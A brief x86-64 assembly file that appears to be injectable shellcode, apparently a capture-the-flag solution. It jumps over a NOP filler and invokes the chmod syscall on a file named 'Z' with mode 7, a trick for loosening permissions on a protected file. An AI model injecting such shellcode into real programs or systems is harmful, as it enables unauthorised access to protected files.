.intel_syntax noprefix

.section .text
.global _start

_start:
    mov al, 90
    push rax
    jmp . + 17
    .fill 15, 1, 0x90
    
    mov rdi, rsp
    mov sil, 7
    syscall
